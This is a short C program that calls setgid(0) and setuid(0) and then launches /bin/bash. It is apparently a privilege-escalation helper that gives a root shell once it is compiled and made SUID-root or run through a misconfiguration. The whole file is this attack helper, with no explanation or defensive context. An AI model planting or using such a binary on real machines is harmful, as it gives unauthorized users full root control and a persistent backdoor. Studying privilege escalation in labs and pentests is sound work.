#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

int main()
{
	setgid(0);
	setuid(0);
	system("/bin/bash");
	return 0;
}
